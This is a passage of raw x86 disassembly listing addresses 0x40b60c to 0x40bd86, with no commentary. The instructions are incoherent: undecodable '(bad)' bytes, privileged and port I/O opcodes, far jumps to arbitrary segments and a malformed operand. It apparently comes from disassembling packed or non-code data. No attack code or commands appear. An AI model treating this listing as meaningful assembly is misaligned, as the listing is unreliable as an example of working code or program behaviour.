  40b60c:	cld    
  40b60d:	jnp    0x40b5cb
  40b60f:	mov    WORD PTR [edx],fs
  40b611:	(bad)
  40b614:	push   0xffffffe6
  40b616:	sbb    ebp,eax
  40b618:	fwait
  40b619:	in     eax,0xcb
  40b61b:	cli    
  40b61c:	icebp  
  40b61d:	push   eax
  40b61e:	lds    edi,FWORD PTR [esi]
  40b620:	(bad)  
  40b622:	jp     0x40b5bc
  40b624:	or     eax,0x901fd835
  40b629:	lahf   
  40b62a:	sub    al,0x15
  40b62c:	dec    ecx
  40b62d:	pop    esp
  40b62e:	mov    ebp,0x8fc624bf
  40b633:	pop    es
  40b634:	add    cl,BYTE PTR [eax+0x1f54ce1d]
  40b63a:	fistp  QWORD PTR [esi+edx*4+0x3053db62]
  40b641:	jecxz  0x40b5cf
  40b643:	xor    cl,ah
  40b645:	dec    ecx
  40b646:	mov    bh,0xa9
  40b648:	jmp    0x5c4d:0xc1638a26
  40b64f:	arpl   WORD PTR [ecx],si
  40b651:	daa    
  40b652:	mov    ch,0xf8
  40b654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b655:	mov    cl,0x8f
  40b657:	call   0x9531ab1d
  40b65c:	sub    al,0x5d
  40b65e:	retf   0xa3c0
  40b661:	add    eax,edi
  40b663:	cwde   
  40b664:	push   edi
  40b665:	add    eax,0x6c5d4ded
  40b66a:	adc    dl,dl
  40b66c:	cwde   
  40b66d:	cs adc ah,bh
  40b670:	cli    
  40b671:	pop    esp
  40b672:	mov    bh,0xce
  40b674:	adc    DWORD PTR [edx],0xd018637e
  40b67a:	btr    DWORD PTR [ebx+0x32],0xba
  40b67f:	retf   0xe8d4
  40b682:	fisttp DWORD PTR [edx+0x5a]
  40b685:	shl    DWORD PTR ds:0xdbb8eb80,cl
  40b68b:	add    al,0xea
  40b68d:	pop    ebx
  40b68e:	dec    ecx
  40b68f:	rcr    DWORD PTR [edi-0x4384503a],cl
  40b695:	push   0xffffff95
  40b697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b698:	jmp    0x7e11:0x332dd5e1
  40b69f:	lea    ebp,[eax-0x164d74d0]
  40b6a5:	push   eax
  40b6a6:	sub    eax,0x69d3bbdb
  40b6ab:	add    esi,DWORD PTR [si+0x34]
  40b6af:	pop    esp
  40b6b0:	into   
  40b6b1:	jmp    0x40b6ef
  40b6b3:	pushf  
  40b6b4:	pop    ebp
  40b6b5:	mov    ebx,0x67de1a82
  40b6ba:	sar    ecx,cl
  40b6bc:	add    eax,0xa71e4110
  40b6c1:	ds (bad) 
  40b6c3:	or     ah,bh
  40b6c5:	dec    ecx
  40b6c6:	stos   DWORD PTR es:[edi],eax
  40b6c7:	test   eax,0xc5101846
  40b6cd:	sbb    al,0x9b
  40b6cf:	sub    esp,DWORD PTR [ecx-0x5c8b0f76]
  40b6d5:	pop    eax
  40b6d6:	inc    esp
  40b6d7:	lock jl 0x40b727
  40b6da:	adc    al,0x3c
  40b6dc:	repz xchg ecx,eax
  40b6de:	lods   eax,DWORD PTR ds:[esi]
  40b6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6e0:	dec    ebx
  40b6e1:	jno    0x40b747
  40b6e3:	mov    dl,0xd5
  40b6e5:	mov    edx,0x365bc20e
  40b6ea:	push   edx
  40b6eb:	iret   
  40b6ec:	and    DWORD PTR [ebp+0x41],0xffffffee
  40b6f0:	ret    0xf56e
  40b6f3:	mov    ds:0x6f8a3018,al
  40b6f8:	jmp    0xc6de:0xb3cc328e
  40b6ff:	outs   dx,BYTE PTR ds:[esi]
  40b700:	mov    ebx,0x69987b84
  40b705:	pushf  
  40b706:	adc    ah,BYTE PTR [ebp+0x201098c1]
  40b70c:	arpl   di,sp
  40b70e:	mov    ebx,0x830b31e
  40b713:	nop
  40b714:	int3   
  40b715:	arpl   WORD PTR [ebp+0x27485684],bx
  40b71b:	test   al,0x22
  40b71d:	jl     0x40b76d
  40b71f:	pusha  
  40b720:	pop    edi
  40b721:	gs std 
  40b723:	mov    esp,0x6429d8ea
  40b728:	push   ebx
  40b729:	stos   DWORD PTR es:[edi],eax
  40b72a:	sub    DWORD PTR [edx-0x1b09c2d1],eax
  40b730:	mov    edi,0xfe185966
  40b735:	and    edx,edx
  40b737:	retf   
  40b738:	(bad)  
  40b739:	cmp    eax,0x618fdd6c
  40b73e:	pop    edx
  40b73f:	ss mov eax,0xc7275c38
  40b745:	pop    ebp
  40b746:	and    esi,ebp
  40b748:	outs   dx,BYTE PTR ds:[esi]
  40b749:	pop    es
  40b74a:	add    dh,BYTE PTR [esi+0x22]
  40b74d:	cmc    
  40b74e:	(bad)  
  40b74f:	(bad)  
  40b750:	adc    al,0x69
  40b752:	les    edx,FWORD PTR [edx]
  40b754:	fsubr  QWORD PTR [edx+0x47]
  40b757:	push   es
  40b758:	and    al,0x11
  40b75a:	rcl    BYTE PTR [edi-0x78],0x55
  40b75e:	cwde   
  40b75f:	adc    DWORD PTR [edi+ecx*8-0x7e7dda39],ecx
  40b766:	enter  0x8156,0xdf
  40b76a:	jbe    0x40b73d
  40b76c:	sbb    al,0xe0
  40b76e:	xchg   ebp,eax
  40b76f:	xchg   ebx,eax
  40b770:	test   edi,0x798812b1
  40b776:	popf   
  40b777:	rcl    DWORD PTR [bp+si+0x10],1
  40b77b:	int    0x36
  40b77d:	gs lock mov edi,0x9604501a
  40b784:	call   0x697b821e
  40b789:	leave  
  40b78a:	cmp    DWORD PTR [ecx+0x16],esp
  40b78d:	xchg   edx,eax
  40b78e:	leave  
  40b78f:	cld    
  40b790:	ja     0x40b793
  40b792:	or     ch,dh
  40b794:	mov    ds:0xa113658e,al
  40b799:	mov    dl,0x86
  40b79b:	sbb    eax,ebx
  40b79d:	loop   0x40b7f3
  40b79f:	lods   eax,DWORD PTR ds:[esi]
  40b7a0:	jle    0x40b7aa
  40b7a2:	push   cs
  40b7a3:	dec    edi
  40b7a4:	fmul   DWORD PTR [edx+eax*8+0xb]
  40b7a8:	xchg   edx,eax
  40b7a9:	and    al,0x80
  40b7ab:	jle    0x40b790
  40b7ad:	mov    edx,ebp
  40b7af:	cmc    
  40b7b0:	or     DWORD PTR [ebp+eax*8-0x24],eax
  40b7b4:	cmp    ch,BYTE PTR [eax+eax*1-0x73d12666]
  40b7bb:	sub    dl,bl
  40b7bd:	pop    ds
  40b7be:	pop    ds
  40b7bf:	and    eax,0x88abca25
  40b7c4:	sbb    BYTE PTR [esi+0x27],0xe1
  40b7c8:	push   ecx
  40b7c9:	bound  esi,QWORD PTR [edx-0x29]
  40b7cc:	mov    BYTE PTR [ebx-0xe3e6fed],dh
  40b7d2:	shl    eax,0xa6
  40b7d5:	sbb    DWORD PTR [esi-0x70],esp
  40b7d8:	mov    eax,ds:0xc25ab106
  40b7dd:	or     al,0xd
  40b7df:	sub    eax,0xa49b4265
  40b7e4:	push   cs
  40b7e5:	cmp    DWORD PTR [ecx+edx*1-0x1cce567c],ecx
  40b7ec:	and    al,0x9a
  40b7ee:	push   0x68
  40b7f0:	pushf  
  40b7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f2:	push   ss
  40b7f3:	repnz or eax,0xd69a878c
  40b7f9:	push   ebp
  40b7fa:	int3   
  40b7fb:	outs   dx,DWORD PTR ds:[esi]
  40b7fc:	(bad)  
  40b7fe:	inc    esi
  40b7ff:	int3   
  40b800:	outs   dx,DWORD PTR ds:[esi]
  40b801:	bnd ret 
  40b803:	or     BYTE PTR [ecx-0xc],dh
  40b806:	pop    ecx
  40b807:	ss dec edi
  40b809:	push   ebx
  40b80a:	inc    ebp
  40b80b:	in     eax,dx
  40b80c:	sahf   
  40b80d:	inc    ecx
  40b80e:	xor    eax,0xf5449055
  40b813:	mov    WORD PTR [eax],gs
  40b815:	ins    BYTE PTR es:[edi],dx
  40b816:	lahf   
  40b817:	or     eax,0x4ea8f7b3
  40b81c:	cli    
  40b81d:	idiv   DWORD PTR [eax-0x46]
  40b820:	add    DWORD PTR [edi],0x4a
  40b823:	dec    ecx
  40b824:	xchg   edx,eax
  40b825:	(bad)  
  40b826:	scas   al,BYTE PTR es:[edi]
  40b827:	je     0x40b826
  40b829:	dec    eax
  40b82a:	ret    0xc76d
  40b82d:	push   eax
  40b82e:	cmp    BYTE PTR [ecx+0x7fdd8f51],ah
  40b834:	xor    eax,DWORD PTR [edx]
  40b836:	ins    DWORD PTR es:[edi],dx
  40b837:	add    DWORD PTR [edi+0x770f1663],edx
  40b83d:	sub    bh,cl
  40b83f:	and    eax,0x5a8a94d2
  40b844:	sbb    DWORD PTR [ebp+0x41],0x6
  40b848:	mov    ch,0x42
  40b84a:	push   ds
  40b84b:	je     0x40b867
  40b84d:	jno    0x40b86e
  40b84f:	inc    ebx
  40b850:	imul   bh
  40b852:	sub    DWORD PTR [esi],edx
  40b854:	das    
  40b855:	or     ah,BYTE PTR [ecx+0x771e3499]
  40b85b:	ret    
  40b85c:	test   dl,bh
  40b85e:	xor    al,0x41
  40b860:	fcom   DWORD PTR [ecx-0x8]
  40b863:	idiv   DWORD PTR [eax+0x22]
  40b866:	sub    DWORD PTR [edi],edx
  40b868:	sbb    al,0xcf
  40b86a:	gs adc esp,DWORD PTR ds:[ebx+0x44]
  40b86f:	stc    
  40b870:	xchg   ebp,eax
  40b871:	inc    esi
  40b872:	mov    DWORD PTR [ebx-0x54aa20d1],esp
  40b878:	dec    edx
  40b879:	jno    0x40b866
  40b87b:	popa   
  40b87c:	je     0x40b808
  40b87e:	es xchg edx,eax
  40b880:	fisubr DWORD PTR ds:0xacb7ec32
  40b886:	popa   
  40b887:	sub    eax,0x5e370574
  40b88c:	pushf  
  40b88d:	dec    edi
  40b88e:	inc    esi
  40b88f:	cli    
  40b890:	adc    BYTE PTR [eax+eax*8+0x7b],0x35
  40b895:	xchg   esi,eax
  40b896:	mov    esi,0x786a4f3f
  40b89b:	inc    esp
  40b89c:	jmp    0x9f386a4b
  40b8a1:	cmp    DWORD PTR [ebp-0x76],edi
  40b8a4:	cdq    
  40b8a5:	push   0xc819151e
  40b8aa:	aad    0x87
  40b8ac:	sbb    BYTE PTR [eax+0x17d8f3a6],al
  40b8b2:	add    eax,0xde20e399
  40b8b7:	ret    
  40b8b8:	in     eax,0xa8
  40b8ba:	push   es
  40b8bb:	cmp    al,0x77
  40b8bd:	test   eax,0xe9b822f4
  40b8c2:	pop    esp
  40b8c3:	loope  0x40b874
  40b8c5:	loop   0x40b881
  40b8c7:	popf   
  40b8c8:	xchg   ebx,eax
  40b8c9:	inc    esi
  40b8ca:	add    al,0xa1
  40b8cc:	xchg   dl,ch
  40b8ce:	mov    ch,0x8e
  40b8d0:	xchg   ebx,eax
  40b8d1:	mov    eax,0x780082dc
  40b8d6:	imul   ebp
  40b8d8:	aam    0x31
  40b8da:	xlat   BYTE PTR ds:[ebx]
  40b8db:	test   BYTE PTR [ecx+0x5d60063c],dh
  40b8e1:	lea    eax,[ebx+0x73fa3cae]
  40b8e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e8:	mov    BYTE PTR [ecx+ebx*4+0x68],dh
  40b8ec:	scas   eax,DWORD PTR es:[edi]
  40b8ed:	add    bh,BYTE PTR [ebp-0x1876826c]
  40b8f3:	mov    bh,0x1e
  40b8f5:	(bad)  
  40b8f6:	fmul   DWORD PTR [esi+edx*2]
  40b8f9:	or     cl,dh
  40b8fb:	call   0x231e:0x79a323e6
  40b902:	and    dl,BYTE PTR [edi]
  40b904:	inc    ebp
  40b905:	mov    eax,ds:0x440d82b4
  40b90a:	jmp    0x73b1:0xfcc2e75e
  40b911:	jne    0x40b8d3
  40b913:	rcr    ah,1
  40b915:	ss pop edx
  40b917:	ins    BYTE PTR es:[edi],dx
  40b918:	dec    edx
  40b919:	aad    0xaf
  40b91b:	test   edx,edx
  40b91d:	shl    DWORD PTR [eax-0x38],cl
  40b920:	mov    ax,ds:0xf0b9d60c
  40b926:	iret   
  40b927:	mov    ?,WORD PTR [eax+0x62]
  40b92a:	(bad)  
  40b92b:	cmc    
  40b92c:	adc    bl,0x1b
  40b92f:	mov    ecx,eax
  40b931:	(bad)  
  40b933:	xor    BYTE PTR [ebx-0x42],bl
  40b936:	dec    ebx
  40b937:	ins    DWORD PTR es:[edi],dx
  40b938:	mov    ecx,0xcba5f471
  40b93d:	iret   
  40b93e:	or     eax,0xcc2c9998
  40b943:	or     cl,BYTE PTR [edx]
  40b945:	je     0x40b973
  40b947:	(bad)  
  40b948:	(bad)  
  40b94a:	adc    DWORD PTR [ecx+0x62],ecx
  40b94d:	mov    ebx,0x169ac682
  40b952:	push   edi
  40b953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b954:	xor    al,BYTE PTR [edi+ebx*2+0x45]
  40b958:	adc    esp,ebp
  40b95a:	enter  0x7c85,0x14
  40b95e:	pop    eax
  40b95f:	mov    bh,0xbf
  40b961:	arpl   WORD PTR [eax+0x14],bp
  40b964:	int    0x94
  40b966:	mov    cs,WORD PTR [esi-0x76]
  40b969:	scas   eax,DWORD PTR es:[edi]
  40b96a:	aaa    
  40b96b:	stos   DWORD PTR es:[edi],eax
  40b96c:	pop    edx
  40b96d:	push   ebx
  40b96e:	push   es
  40b96f:	xlat   BYTE PTR ds:[ebx]
  40b970:	xchg   ebx,eax
  40b971:	icebp  
  40b972:	stc    
  40b973:	add    eax,0x6f1791a1
  40b978:	xchg   ebp,eax
  40b979:	(bad)  
  40b97a:	and    eax,DWORD PTR [esi-0x627ac09c]
  40b980:	adc    ch,BYTE PTR [edx]
  40b982:	pop    eax
  40b983:	add    al,0x1a
  40b985:	pop    es
  40b986:	scas   al,BYTE PTR es:[edi]
  40b987:	fld    TBYTE PTR [ebx]
  40b989:	cmp    BYTE PTR [esi],dl
  40b98b:	sti    
  40b98c:	xchg   edi,eax
  40b98d:	ss ret 0x1c1d
  40b991:	call   0x907b27b7
  40b996:	xchg   ebp,eax
  40b997:	arpl   WORD PTR [edx-0x47],si
  40b99a:	test   DWORD PTR [eax],ecx
  40b99c:	add    ah,BYTE PTR [edi]
  40b99e:	xor    dh,BYTE PTR [eax+0x6]
  40b9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9a2:	stos   DWORD PTR es:[edi],eax
  40b9a3:	jbe    0x40b940
  40b9a5:	iret   
  40b9a6:	xor    eax,0xf90f8e01
  40b9ab:	mov    ds,WORD PTR [edi+edx*4]
  40b9ae:	or     BYTE PTR [edx+eiz*1-0x5b],dl
  40b9b2:	mov    bh,BYTE PTR gs:[esi+edx*2+0x53]
  40b9b7:	mov    bh,0xa1
  40b9b9:	push   esi
  40b9ba:	ror    DWORD PTR [ebx-0x21],cl
  40b9bd:	mov    WORD PTR ds:0x9804c772,cs
  40b9c3:	sub    edi,DWORD PTR fs:[edi-0x6b]
  40b9c7:	jg     0x40b985
  40b9c9:	sbb    bl,BYTE PTR ds:0x24c61f1d
  40b9cf:	push   edx
  40b9d0:	stos   DWORD PTR es:[edi],eax
  40b9d1:	lods   eax,DWORD PTR ds:[esi]
  40b9d2:	aaa    
  40b9d3:	lea    edi,cs:[ebp+0x48e55be6]
  40b9da:	loope  0x40ba0c
  40b9dc:	mov    WORD PTR [ecx-0x50],ss
  40b9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e0:	mov    ecx,0xe08b238d
  40b9e5:	fsub   DWORD PTR [eax-0x3cf2bfe2]
  40b9eb:	push   ebx
  40b9ec:	lods   eax,DWORD PTR ds:[esi]
  40b9ed:	and    edx,esi
  40b9ef:	mov    cl,0xa1
  40b9f1:	push   eax
  40b9f2:	lock mov dl,0x36
  40b9f5:	jnp    0x40ba51
  40b9f7:	inc    ebx
  40b9f8:	icebp  
  40b9f9:	fmul   DWORD PTR ds:0xd67dcc88
  40b9ff:	jae    0x40ba57
  40ba01:	ret    0xf4f
  40ba04:	icebp  
  40ba05:	mov    cl,0x8
  40ba07:	push   ebx
  40ba08:	repnz jmp 0xb1:0x16ef
  40ba0f:	out    dx,al
  40ba10:	cmc    
  40ba11:	adc    DWORD PTR [ecx+0x56ed4781],0xffffff84
  40ba18:	mov    ds:0x2e621539,eax
  40ba1d:	(bad)  
  40ba1e:	sbb    al,0xfc
  40ba20:	imul   BYTE PTR [ebx]
  40ba22:	retf   0xb766
  40ba25:	cmc    
  40ba26:	mov    eax,0x47e907f7
  40ba2b:	inc    ecx
  40ba2c:	sar    DWORD PTR [esi-0x3d],cl
  40ba2f:	cs (bad) 
  40ba31:	out    0x84,eax
  40ba33:	mov    ebp,0xd16ffd3d
  40ba38:	dec    edx
  40ba39:	aad    0xd8
  40ba3b:	add    ah,BYTE PTR [edx-0x4c]
  40ba3e:	ss xchg cl,ch
  40ba41:	ja     0x40ba03
  40ba43:	adc    al,0x71
  40ba45:	xchg   DWORD PTR [esi+0x71],ecx
  40ba48:	jl     0x40ba94
  40ba4a:	pop    es
  40ba4b:	mov    esi,0x43553d19
  40ba50:	adc    eax,0x163f7736
  40ba55:	xchg   DWORD PTR [ebx+0x67d3fea0],esp
  40ba5b:	lods   eax,DWORD PTR ds:[esi]
  40ba5c:	pop    es
  40ba5d:	daa    
  40ba5e:	adc    al,0xe2
  40ba60:	fstp   DWORD PTR [edx+edx*2+0x152c8b90]
  40ba67:	mov    dh,0x99
  40ba69:	dec    eax
  40ba6a:	daa    
  40ba6b:	jbe    0x40b9f9
  40ba6d:	cmp    BYTE PTR [ebx-0x3a45ef7f],cl
  40ba73:	sbb    BYTE PTR [eax],0x76
  40ba76:	loop   0x40ba73
  40ba78:	cmp    ebx,DWORD PTR [ecx+edx*4+0x21cf3d4f]
  40ba7f:	or     DWORD PTR [ecx+eax*8-0x6fd5798e],esi
  40ba86:	inc    edx
  40ba87:	push   0x6f18093c
  40ba8c:	sub    al,0x2e
  40ba8e:	sbb    eax,0xa22f67a8
  40ba93:	out    dx,al
  40ba94:	pop    ecx
  40ba95:	mov    eax,ds:0x6bd19245
  40ba9a:	cld    
  40ba9b:	xchg   esi,eax
  40ba9c:	test   DWORD PTR [edx-0x57682f6a],ebp
  40baa2:	sbb    al,0xd2
  40baa4:	adc    BYTE PTR [ebx+ecx*2+0x2ebf9494],cl
  40baab:	jae    0x40bafd
  40baad:	std    
  40baae:	inc    cx
  40bab0:	sahf   
  40bab1:	mov    edx,0xbd3b0a58
  40bab6:	jecxz  0x40bb22
  40bab8:	sub    bl,al
  40baba:	cmp    al,0x24
  40babc:	sub    DWORD PTR ds:0x2c239bf2,esp
  40bac2:	pop    esi
  40bac3:	adc    al,0xe7
  40bac5:	fs fwait
  40bac7:	enter  0x9404,0xd4
  40bacb:	and    edx,DWORD PTR [eax]
  40bacd:	mov    bl,0x84
  40bacf:	loopne 0x40bb17
  40bad1:	js     0x40ba5b
  40bad3:	jo     0x40bae1
  40bad5:	pop    ecx
  40bad6:	clc    
  40bad7:	mov    dl,0xa0
  40bad9:	fstp   st(4)
  40badb:	pop    ebx
  40badc:	rcl    esi,0xc8
  40badf:	dec    edx
  40bae0:	jne    0x40bb1d
  40bae2:	jns    0x40bad1
  40bae4:	adc    al,0xcd
  40bae6:	out    0xce,al
  40bae8:	push   0x5c
  40baea:	and    esi,edi
  40baec:	std    
  40baed:	cmp    esp,edx
  40baef:	fistp  DWORD PTR [ecx+0x77f5a559]
  40baf5:	jmp    0xba05:0xdce312bf
  40bafc:	pop    DWORD PTR [eax]
  40bafe:	inc    edi
  40baff:	mov    ch,0xc6
  40bb01:	xor    al,BYTE PTR [ecx]
  40bb03:	and    edi,DWORD PTR [ecx-0x451ad692]
  40bb09:	adc    eax,ebp
  40bb0b:	lea    esp,[ebp+0x53a80524]
  40bb11:	xchg   ebp,eax
  40bb12:	imul   ecx,DWORD PTR [ebx+ecx*8+0x65d9f1d0],0x34
  40bb1a:	out    dx,al
  40bb1b:	retf   0x20ba
  40bb1e:	xchg   esp,eax
  40bb1f:	inc    edi
  40bb20:	ss dec esi
  40bb22:	dec    ebx
  40bb23:	pop    ecx
  40bb24:	hlt    
  40bb25:	add    eax,0x73800591
  40bb2a:	jl     0x40bb15
  40bb2c:	std    
  40bb2d:	(bad)  
  40bb2e:	xlat   BYTE PTR ds:[ebx]
  40bb2f:	mov    ah,0x32
  40bb31:	ins    DWORD PTR es:[edi],dx
  40bb32:	arpl   WORD PTR ds:0x4a77507,ax
  40bb38:	push   eax
  40bb39:	adc    eax,DWORD PTR [eax]
  40bb3b:	or     bh,BYTE PTR [ebx+0x26]
  40bb3e:	pop    ds
  40bb3f:	adc    DWORD PTR [ebx-0x67],0xffffff8a
  40bb43:	sbb    BYTE PTR [ebx+0x4548f6fb],0xf4
  40bb4a:	cli    
  40bb4b:	call   0xcf28:0x5dd29f7b
  40bb52:	outs   dx,DWORD PTR ds:[esi]
  40bb53:	addr16 mov esi,0x82b71fb8
  40bb59:	outs   dx,DWORD PTR ds:[esi]
  40bb5a:	mov    ch,ah
  40bb5c:	add    eax,0x9d379ac5
  40bb61:	inc    ecx
  40bb62:	pop    ss
  40bb63:	push   ds
  40bb64:	call   0x5dab:0x97f8bf4e
  40bb6b:	fld    st(6)
  40bb6d:	or     dl,BYTE PTR [ecx]
  40bb6f:	neg    DWORD PTR [esi+0x29]
  40bb72:	xchg   edi,eax
  40bb73:	outs   dx,DWORD PTR ds:[esi]
  40bb74:	mov    ds:0xa2ea5c6e,eax
  40bb79:	aam    0x20
  40bb7b:	push   0x49
  40bb7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb7e:	call   0xa205:0xdd689347
  40bb85:	in     eax,dx
  40bb86:	mov    ecx,0x24c6223
  40bb8b:	scas   al,BYTE PTR es:[edi]
  40bb8c:	inc    esi
  40bb8d:	xchg   ebp,eax
  40bb8e:	psllq  mm0,mm5
  40bb91:	push   es
  40bb92:	cmp    BYTE PTR [ecx+ecx*4+0x6729dc0e],dl
  40bb99:	mov    ebx,0x3c77e841
  40bb9e:	push   ebp
  40bb9f:	stos   BYTE PTR es:[edi],al
  40bba0:	and    BYTE PTR [ecx+0x5ffc29aa],dl
  40bba6:	scas   al,BYTE PTR es:[edi]
  40bba7:	push   ss
  40bba8:	sbb    al,dl
  40bbaa:	push   esp
  40bbab:	ret    0x4311
  40bbae:	jl     0x40bb3c
  40bbb0:	bsf    esp,DWORD PTR [ebp+0x29b2ae37]
  40bbb7:	sbb    ecx,esi
  40bbb9:	jo     0x40bb3d
  40bbbb:	es jl  0x40bc38
  40bbbe:	sahf   
  40bbbf:	repz inc ebx
  40bbc1:	adc    al,0xc5
  40bbc3:	and    ebx,ecx
  40bbc5:	js     0x40bc2a
  40bbc7:	std    
  40bbc8:	retf   
  40bbc9:	push   0x9588cda1
  40bbce:	repnz ss fwait
  40bbd1:	sub    edx,edx
  40bbd3:	mov    ah,0x77
  40bbd5:	adc    DWORD PTR [ebx+0x5],ebx
  40bbd8:	std    
  40bbd9:	(bad)  
  40bbda:	(bad)  [ecx+0x5e]
  40bbdd:	dec    eax
  40bbde:	and    DWORD PTR [ecx+edx*2-0x5],eax
  40bbe2:	rcl    BYTE PTR [eax-0x2e30ba21],cl
  40bbe8:	js     0x40bc29
  40bbea:	or     eax,0x297a187f
  40bbef:	and    al,0x29
  40bbf1:	call   FWORD PTR [ebx+edx*4-0x26284be5]
  40bbf8:	nop
  40bbf9:	sub    ah,BYTE PTR [ecx+0x29]
  40bbfc:	add    edi,DWORD PTR [edi]
  40bbfe:	test   DWORD PTR [eax],edi
  40bc00:	sub    eax,DWORD PTR [esi+0x9cb83b7]
  40bc06:	jbe    0x40bc47
  40bc08:	cld    
  40bc09:	inc    edx
  40bc0a:	popa   
  40bc0b:	dec    ebp
  40bc0c:	xor    dl,BYTE PTR ds:0xad04e22
  40bc12:	dec    esp
  40bc13:	jle    0x40bbbf
  40bc15:	mov    ebp,0x3c40f4b7
  40bc1a:	push   ds
  40bc1b:	xor    BYTE PTR [ecx-0x34],bl
  40bc1e:	or     ebx,DWORD PTR [esi-0x5966f99f]
  40bc24:	sub    eax,0xd5e1b84d
  40bc29:	jb     0x40bc9f
  40bc2b:	add    BYTE PTR [eax-0x23],bh
  40bc2e:	ds fcmovbe st,st(1)
  40bc31:	shl    DWORD PTR [esi-0x66],0x9e
  40bc35:	popa   
  40bc36:	or     DWORD PTR [ebp+0x64],edx
  40bc39:	and    DWORD PTR [ebx+0x5a62827f],edx
  40bc3f:	(bad)  
  40bc40:	mov    ds:0x20d3f801,al
  40bc45:	cmp    edx,DWORD PTR [eax+edi*1]
  40bc48:	dec    ebp
  40bc49:	in     eax,0xfd
  40bc4b:	cmp    al,BYTE PTR [ecx+ecx*2]
  40bc4e:	adc    BYTE PTR [ebx],ch
  40bc50:	push   ecx
  40bc51:	loopne 0x40bbdc
  40bc53:	jno    0x40bc84
  40bc55:	inc    esi
  40bc56:	test   DWORD PTR ds:0xf535e2a8,0x9eb7b319
  40bc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc61:	or     bl,al
  40bc63:	add    eax,0x3513222
  40bc68:	mov    edx,0xa2050063
  40bc6d:	stos   DWORD PTR es:[edi],eax
  40bc6e:	jbe    0x40bc1c
  40bc70:	mov    ah,0xeb
  40bc72:	iret   
  40bc73:	loopne 0x40bc7d
  40bc75:	jge    0x40bce1
  40bc77:	mov    cl,0x12
  40bc79:	sub    eax,0xc837c8a2
  40bc7e:	sub    ah,ah
  40bc80:	push   esi
  40bc81:	mov    ah,0x20
  40bc83:	and    bh,BYTE PTR [bx+di-0x5a0c]
  40bc88:	mov    ecx,ebx
  40bc8a:	rol    DWORD PTR [ecx+edx*8],0xc4
  40bc8e:	popf   
  40bc8f:	ins    DWORD PTR es:[edi],dx
  40bc90:	or     esi,edx
  40bc92:	xor    DWORD PTR [ebx+0x8564a3d],ebp
  40bc98:	cmp    al,0x33
  40bc9a:	mov    BYTE PTR [bp+di+0x48],bh
  40bc9e:	adc    ebx,DWORD PTR [eax+0x37f43c48]
  40bca4:	push   eax
  40bca5:	shl    ebx,1
  40bca7:	sti    
  40bca8:	fmul   st,st(6)
  40bcaa:	jae    0x40bc38
  40bcac:	in     ax,dx
  40bcae:	leave  
  40bcaf:	mov    al,0x62
  40bcb1:	or     dh,BYTE PTR [ecx+0x5f]
  40bcb4:	ds stos BYTE PTR es:[edi],al
  40bcb6:	int    0xa
  40bcb8:	pop    esp
  40bcb9:	lahf   
  40bcba:	fdivr  QWORD PTR [ebx+0x52]
  40bcbd:	or     al,0xa7
  40bcbf:	mov    esi,0xac4c35ba
  40bcc4:	mov    bh,0xb7
  40bcc6:	retf   
  40bcc7:	mov    edx,0x7e0a7b23
  40bccc:	mov    edx,0x44477462
  40bcd1:	fldcw  WORD PTR [esi]
  40bcd3:	jb     0x40bd3d
  40bcd5:	jns    0x40bc5e
  40bcd7:	dec    edx
  40bcd8:	iret   
  40bcd9:	or     DWORD PTR [esi],ebp
  40bcdb:	or     DWORD PTR [edx+esi*8],eax
  40bcde:	(bad)  
  40bcdf:	lahf   
  40bce0:	into   
  40bce1:	hlt    
  40bce2:	sub    ah,BYTE PTR [ecx]
  40bce4:	iret   
  40bce5:	mov    al,0x7d
  40bce7:	xchg   esi,eax
  40bce8:	mov    esp,0xe83a3416
  40bced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcee:	fstp   TBYTE PTR [esi+0x2f]
  40bcf1:	or     ah,BYTE PTR [edx]
  40bcf3:	ret    
  40bcf4:	ins    DWORD PTR es:[edi],dx
  40bcf5:	adc    ch,BYTE PTR [edx+0x42]
  40bcf8:	lods   eax,DWORD PTR ds:[esi]
  40bcf9:	dec    esp
  40bcfa:	jg     0x40bd00
  40bcfc:	shl    ch,1
  40bcfe:	add    eax,0xe3b18645
  40bd03:	jnp    0x40bcac
  40bd05:	out    dx,eax
  40bd06:	jmp    0xb8adbc8e
  40bd0b:	dec    edx
  40bd0c:	and    BYTE PTR [edi+0x23466013],ah
  40bd12:	mov    edx,0xca859573
  40bd17:	sbb    dh,BYTE PTR [ecx-0x272e26c3]
  40bd1d:	sub    DWORD PTR [esp+ebp*1+0xf3c78b4],esp
  40bd24:	pop    edi
  40bd25:	sbb    DWORD PTR [ebx+ecx*4-0x38f7b40b],ecx
  40bd2c:	pop    esp
  40bd2d:	xchg   esp,eax
  40bd2e:	mov    bh,0x3a
  40bd30:	(bad)  
  40bd31:	jo     0x40bd73
  40bd33:	jge    0x40bd31
  40bd35:	dec    ecx
  40bd36:	in     eax,0xe
  40bd38:	push   ebp
  40bd39:	xchg   esp,eax
  40bd3a:	test   eax,0xb39a712f
  40bd3f:	mov    ah,0x3f
  40bd41:	inc    esi
  40bd42:	mov    eax,0x37f34343
  40bd47:	gs push edi
  40bd49:	dec    esp
  40bd4a:	mov    dl,0xa2
  40bd4c:	xor    eax,DWORD PTR [esi+0x27696de4]
  40bd52:	nop
  40bd53:	sub    BYTE PTR [esi+esi*2],ah
  40bd56:	loopne 0x40bd14
  40bd58:	jne    0x40bdb3
  40bd5a:	pop    esi
  40bd5b:	xchg   edx,eax
  40bd5c:	daa    
  40bd5d:	xor    al,0x84
  40bd5f:	repnz sar BYTE PTR [esi+0x2f],0x4
  40bd64:	pop    ecx
  40bd65:	data16 aas 
  40bd67:	psubq  mm0,QWORD PTR [ecx-0x2af364f1]
  40bd6e:	sbb    bl,BYTE PTR [edx+ecx*8+0x41574c21]
  40bd75:	std    
  40bd76:	push   cs
  40bd77:	xor    al,0x8
  40bd79:	mov    esp,0x7e8440e8
  40bd7e:	jo     0x40bd2f
  40bd80:	xor    eax,DWORD PTR ds:0x520ee08a
  40bd86:	jmp    0x7faa066d
